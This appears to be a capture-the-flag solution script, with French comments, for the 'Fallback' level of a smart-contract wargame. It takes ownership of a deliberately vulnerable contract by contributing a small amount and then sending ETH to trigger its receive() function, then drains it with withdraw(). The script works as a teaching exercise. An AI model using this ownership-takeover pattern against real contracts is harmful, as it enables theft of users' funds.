// Level 1: Fallback - Solution
// L'objectif est de devenir propriétaire puis vider le contrat

// Étape 1: Vérifier le propriétaire actuel
(async () => {
    console.log("Propriétaire actuel:", await contract.owner());
    console.log("Notre contribution initiale:", (await contract.getContribution()).toString());
    console.log("Balance du contrat:", (await web3.eth.getBalance(contract.address)).toString());
  })();
  
  // Étape 2: Faire une contribution minimale pour établir contributions[msg.sender] > 0
  // Cette étape est nécessaire pour satisfaire la condition dans receive()
  (async () => {
    // Petite contribution en dessous de la limite de 0.001 ether
    await contract.contribute({
      value: web3.utils.toWei("0.0001", "ether")
    });
    console.log("Contribution après étape 2:", (await contract.getContribution()).toString());
  })();
  
  // Étape 3: Envoyer directement de l'ETH pour déclencher la fonction receive()
  // Cela nous fait devenir propriétaire instantanément car notre contribution est > 0
  (async () => {
    await web3.eth.sendTransaction({
      from: player,
      to: contract.address,
      value: web3.utils.toWei("0.0001", "ether")
    });
    console.log("Nouveau propriétaire:", await contract.owner());
    console.log("Est-ce nous?: ", (await contract.owner()) === player);
  })();
  
  // Étape 4: Vider le contrat en utilisant la fonction withdraw() 
  // Maintenant accessible car nous sommes propriétaire
  (async () => {
    await contract.withdraw();
    console.log("Balance finale du contrat:", (await web3.eth.getBalance(contract.address)).toString());
  })();
  
  /* 
  Explication technique du flux d'exploitation:
  
  1. contribute(): Nous permet d'enregistrer une contribution positive
     - Paramètre: {value: web3.utils.toWei("0.0001", "ether")}
     - C'est une quantité minimale qui satisfait la condition tout en minimisant notre dépense
  
  2. web3.eth.sendTransaction(): Envoie directement de l'ETH au contrat
     - Paramètres:
       - from: Notre adresse (player)
       - to: L'adresse du contrat
       - value: Une quantité positive d'ETH
     - Cette transaction déclenche la fonction receive() qui nous fait devenir propriétaire
  
  3. withdraw(): Vide le contrat
     - Cette fonction ne peut être appelée que par le propriétaire (nous maintenant)
     - Transfère toute la balance du contrat vers le propriétaire
  */